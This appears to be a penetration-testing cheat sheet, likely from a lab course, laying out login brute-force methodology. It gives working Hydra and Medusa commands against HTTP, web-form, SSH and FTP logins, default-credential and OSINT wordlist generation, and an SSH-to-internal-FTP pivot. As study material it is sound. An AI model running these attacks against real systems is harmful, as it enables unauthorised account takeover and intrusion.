# Login Brute Forcing Methodology

**Core principle:** Start with the simplest, most targeted approach. Default creds before wordlists. Known username before username fuzzing. Smallest filtered wordlist before large generic ones.

---

## Attack Type Selection

```
What do you know about the target?
  ├─ Known username + unknown password → single-user password brute force
  ├─ Unknown username + unknown password → username + password brute force
  ├─ Target is a specific person → OSINT → Username Anarchy + CUPP
  ├─ Target uses default device/software → try default creds first
  └─ Password policy known → filter wordlist with grep before attacking
```

---

## Phase 1 — Reconnaissance

### Identify the authentication type
- **Basic HTTP Auth** — browser shows a native login dialog; `Authorization: Basic <base64>` header
- **Web login form** — HTML form with POST action; inspect source for field names and action path
- **SSH** — port 22 (or custom); remote shell access
- **FTP** — port 21; file transfer service

### Read the form HTML first
```bash
curl -s http://<TARGET>/ | grep -i "form\|input\|action\|method"
```

Key things to extract:
- Form method: GET or POST
- Form action path (e.g. `/`, `/login`, `/login.php`)
- Input field names (e.g. `username`, `password`, `user`, `pass`)
- Error message on failed login (for `F=` condition)
- Success indicator (redirect, keyword like "Dashboard") for `S=` condition

### Check for default credentials first
Try common defaults before running a full wordlist attack:
- `admin:admin`, `admin:password`, `admin:1234`, `root:root`, `root:toor`
- Use `Default-Credentials/default-passwords.txt` from SecLists

---

## Phase 2 — Wordlist Selection

### Standard wordlists (SecLists)
| Wordlist | Use |
|----------|-----|
| `rockyou.txt` | Large password list, go-to for most attacks |
| `2023-200_most_used_passwords.txt` | Fast — 200 most common passwords |
| `500-worst-passwords.txt` | Fastest — 500 worst passwords |
| `darkweb2017_top-10000.txt` | 10k common passwords, good for policy filtering |
| `top-usernames-shortlist.txt` | Quick username attempts (17 entries) |
| `xato-net-10-million-usernames.txt` | Thorough username brute forcing |
| `Default-Credentials/default-passwords.txt` | Default device/software creds |

### Filter wordlist to match a password policy
```bash
# Chain grep filters — each filter pipes into the next
grep -E '^.{8,}$' wordlist.txt      > f1.txt   # min 8 chars
grep -E '[A-Z]' f1.txt              > f2.txt   # has uppercase
grep -E '[a-z]' f2.txt              > f3.txt   # has lowercase
grep -E '[0-9]' f3.txt              > f4.txt   # has number
grep -E '[!@#$%^&*]' f4.txt        > f5.txt   # has special char
# Two special chars:
grep -E '([!@#$%^&*].*){2,}' f4.txt > f5.txt

wc -l f5.txt   # check how many remain
```

### Custom wordlists for a specific person
```bash
# Username list from real name
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy "First" "Last" > usernames.txt

# Password list from OSINT profile
sudo apt install cupp -y
cupp -i   # interactive — enter name, birthdate, partner, pet, company, keywords
# Outputs: firstname.txt (~46k passwords before filtering)
```

---

## Phase 3 — Attack Execution

### Hydra — Basic HTTP Authentication
```bash
hydra -l <user> -P <wordlist> <TARGET> http-get / -s <PORT>
# or with user list:
hydra -L users.txt -P passwords.txt <TARGET> http-get / -s <PORT>
```

### Hydra — Web Login Form (POST)
```bash
hydra -L users.txt -P passwords.txt <TARGET> -s <PORT> -f \
  http-post-form "/<path>:user_field=^USER^&pass_field=^PASS^:F=<failure_string>"

# Use S= instead of F= when you know the success indicator:
http-post-form "/<path>:user_field=^USER^&pass_field=^PASS^:S=302"
http-post-form "/<path>:user_field=^USER^&pass_field=^PASS^:S=Dashboard"
```

### Medusa — SSH
```bash
medusa -h <IP> -n <PORT> -u <user> -P <wordlist> -M ssh -t 3
```

### Medusa — FTP (from inside SSH session)
```bash
# Download wordlist to remote box first
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

medusa -h 127.0.0.1 -u <ftpuser> -P <wordlist> -M ftp -t 5
# Use 127.0.0.1 not localhost — forces IPv4
```

### Medusa — Web Form
```bash
medusa -M web-form -h <TARGET> -U users.txt -P passwords.txt \
  -m "FORM:username=^USER^&password=^PASS^:F=Invalid"
```

---

## Phase 4 — Post-Authentication

### Basic HTTP Auth
```bash
curl -s -u user:password http://<TARGET>:<PORT>/
```

### Web login form (session cookie)
```bash
# Step 1: POST login — save cookie
curl -s -X POST http://<TARGET>:<PORT>/<path> \
  --data-urlencode 'username=<user>' \
  --data-urlencode 'password=<pass>' \
  -c cookies.txt

# Step 2: GET authenticated page with saved cookie
curl -s http://<TARGET>:<PORT>/success -b cookies.txt
```

### FTP — connect and retrieve flag
```bash
ftp ftp://ftpuser:<password>@127.0.0.1
# Inside FTP:
ls
get flag.txt
exit
cat flag.txt
```

---

## Phase 5 — Internal Pivot (SSH → Internal Services)

Once inside via SSH:
```bash
# Find listening services
netstat -tulpn | grep LISTEN

# Confirm service types
nmap localhost

# Check /home for username hints
ls /home
```

If FTP is found on port 21:
- Check `/home` for folder names → likely FTP usernames
- Brute force FTP from inside the SSH session using `127.0.0.1`

---

## Hydra Flags Reference
| Flag | Purpose |
|------|---------|
| `-l USER` / `-L FILE` | Single username / list |
| `-p PASS` / `-P FILE` | Single password / list |
| `-t TASKS` | Parallel threads (default 16) |
| `-f` | Stop after first success |
| `-s PORT` | Non-default port |
| `-V` | Show every attempt |
| `-M FILE` | Multiple targets |

## Medusa Flags Reference
| Flag | Purpose |
|------|---------|
| `-h HOST` / `-H FILE` | Single target / list |
| `-u USER` / `-U FILE` | Single username / list |
| `-p PASS` / `-P FILE` | Single password / list |
| `-M MODULE` | Service module |
| `-m "OPTIONS"` | Module-specific options |
| `-t TASKS` | Parallel threads |
| `-f` / `-F` | Stop on first success (host / any) |
| `-n PORT` | Non-default port |
| `-e ns` | Also try empty password + username-as-password |

---

## Common Pitfalls

| Pitfall | Fix |
|---------|-----|
| Special chars (`!`, `@`, `!!`) in password mangled by bash | Use `--data-urlencode` with single quotes |
| `/success` returns 405 on POST | Login sets session cookie — use `-c cookies.txt` on POST, `-b cookies.txt` on GET |
| `-L` with `-l` following redirect gives wrong result | Always carry cookie separately, don't rely on `-L` for auth |
| Wordlist not on remote box | `wget` the wordlist before running Medusa |
| Medusa FTP failing with `localhost` | Use `127.0.0.1` — forces IPv4 |
| CUPP generates 46k passwords but policy narrows it | Always filter with grep before attacking |
| `!!` history expansion in bash | Use single quotes or `--data-urlencode` |
